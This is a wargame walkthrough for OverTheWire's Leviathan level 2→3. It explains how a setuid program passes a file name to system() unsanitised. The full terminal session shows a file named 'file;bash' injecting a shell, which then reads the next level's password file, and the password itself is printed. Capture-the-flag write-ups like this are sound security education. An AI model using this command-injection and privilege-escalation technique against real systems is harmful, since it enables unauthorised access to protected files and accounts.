# Leviathan Level 2 -> 3

**Password:** Q0G8j4sakn

## Solution

This level has another program that we can try running. At first I thought the easiest thing would be to test out if I just put the file path to the /etc/leviathan_pass/leviathan3 it would just spit out the password since that’s the path they always use for all the wargames. That didn’t work unfortanutely, since they already anticipated people doing that. Next thing, I used the same ltrace command to see what’s going on, and it seemed to run access() a library permission function that checks what kind of permissions do we have on a passed file. If we take a step back a bit and run this “./printfile /etc/passwd” and since I have permission to read that file

sprintf ("/bin/cat /etc/passwd", 511, "/bin/cat %s", "/etc/passwd")

So all it does is combine the given file path and runs the system function to execute it, now if you try to do the same with multiple files separated by space like ltrace  ./printfile "a.txt b.txt", I got this

system("/bin/cat a.txt b.txt"bar
/bin/cat: b.txt: No such file or directory

So I realised that this function is probably prone to some malicious user input so the first thing that jumped to was the command injection attack. Like I learned from previous wargames, I created a temp directory to play around in. As for the command injection it took me a while to understand how to use it here and eventually after reading that you can just use “;” to separate running different bash commands I can probably try it here to so the idea would be that the program would execute /bin/cat file;bash as if its a file name, but the program would evaluate this as executing /bin/cat file(file is the argument) and then evaluate the rest to run bash as a separate command. I learned about the file;bash technique online.


leviathan2@gibson:~$ ls
printfile
leviathan2@gibson:~$ mktemp -d
/tmp/tmp.bNz8oOGCub
leviathan2@gibson:~$ cd /tmp/tmp.bNz8oOGCub
leviathan2@gibson:/tmp/tmp.bNz8oOGCub$ touch 'file;bash'
leviathan2@gibson:/tmp/tmp.bNz8oOGCub$ ls
file;bash
leviathan2@gibson:/tmp/tmp.bNz8oOGCub$ cd
leviathan2@gibson:~$ ls
printfile
leviathan2@gibson:~$ ./printfile /tmp/tmp.bNz8oOGCub/file\;bash 
/bin/cat: /tmp/tmp.bNz8oOGCub/file: Permission denied
leviathan3@gibson:~$ ls
printfile
leviathan3@gibson:~$ cat /etc/leviathan_pass//leviathan3
Q0G8j4sakn
